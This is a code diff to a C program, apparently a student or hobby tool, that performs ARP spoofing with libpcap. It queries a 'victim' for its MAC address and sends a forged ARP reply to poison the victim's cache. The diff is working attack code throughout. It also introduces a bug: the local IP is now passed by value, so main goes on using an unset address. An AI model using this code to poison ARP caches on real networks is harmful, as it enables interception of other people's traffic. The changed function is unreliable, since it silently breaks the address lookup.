@@ -47,7 +47,7 @@ void print_mac(uint8_t *mac, int len) {
 }
 
 // Get Local MAC ADDRESS & IP ADDRESS
-int check_my_add(uint8_t *my_mac, struct in_addr *my_ip, const char *interface)
+int check_my_add(uint8_t *my_mac, struct in_addr my_ip, const char *interface)
 {
     struct ifreq buf;
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -74,7 +74,12 @@ int check_my_add(uint8_t *my_mac, struct in_addr *my_ip, const char *interface)
         perror("ERROR : ioctl - IP");
         return -1;
     }
-    *my_ip = ((struct sockaddr_in *)&buf.ifr_addr)->sin_addr;
+    my_ip = ((struct sockaddr_in *)&buf.ifr_addr)->sin_addr;
+
+    // Print the addresses
+    printf("my IP  : %s\nmy MAC : ", inet_ntoa(my_ip));
+    print_mac(my_mac, 6);
+    printf("\n");
 
     return 0;
 }
@@ -126,7 +131,11 @@ int victim_mac_req(uint8_t *my_mac, uint8_t *v_mac, struct in_addr my_ip, struct
     offset += 4;
     
     // SEND REQUEST
-    pcap_sendpacket(handle, (u_char*)(send_buf), offset);
+    if(pcap_sendpacket(handle, (u_char*)(send_buf), offset) < 0)
+    {
+        perror("ERROR : ARP Request to Victim Fail");
+        return -1;
+    }
 
     /***************************Receive Reply**************************/
     while(true)
@@ -156,8 +165,9 @@ int victim_mac_req(uint8_t *my_mac, uint8_t *v_mac, struct in_addr my_ip, struct
                     {
                         v_mac[i] = (uint8_t)rcv_buf[i];
                     } 
-                    printf("Victim's MAC\n");
+                    printf("Victim's MAC = ");
                     print_mac(v_mac, 6);
+                    printf("\n");
                     free(ETH);
                     free(ARP);
                     return 0; 
@@ -216,7 +226,11 @@ int send_arp_reply(uint8_t *my_mac, uint8_t *v_mac, struct in_addr my_ip, struct
     offset += 4;
     
     // SEND REQUEST
-    pcap_sendpacket(handle, (u_char*)(send_buf), offset);
+    if(pcap_sendpacket(handle, (u_char*)(send_buf), offset) < 0)
+    {
+        perror("ERROR : ARP Attack - sendpacket Failure");
+        return -1;
+    }
 
     printf("ARP Fake Packet Sent\n");
     dump((u_char* )send_buf, offset);
@@ -226,7 +240,6 @@ int send_arp_reply(uint8_t *my_mac, uint8_t *v_mac, struct in_addr my_ip, struct
     free(ARP);
     return 0;
 }
-
 
 int main(int argc, char *argv[])
 {
@@ -250,17 +263,16 @@ int main(int argc, char *argv[])
         perror("ERROR : wrong INPUT IP Address! - target");
 
     // Get my local MAC / IP address
-    check_my_add(my_mac, &my_ip, argv[1]);
-
-    // for DEBUG
-    printf("IP  : %s\nMAC : ", inet_ntoa(my_ip));
-    print_mac(my_mac, 6);
+    if(check_my_add(my_mac, my_ip, argv[1]) < 0)
+        return -1;
 
     // Get Victim's MAC Address
-    victim_mac_req(my_mac, victim_mac, my_ip, victim_ip, argv[1]);
+    if(victim_mac_req(my_mac, victim_mac, my_ip, victim_ip, argv[1]) < 0)
+        return -1;
 
     // Send ARP Request(False)
-    send_arp_reply(my_mac, victim_mac, my_ip, victim_ip, target_ip, argv[1]);
+    if(send_arp_reply(my_mac, victim_mac, my_ip, victim_ip, target_ip, argv[1]) < 0)
+        return -1;
 
     return 0;
 }
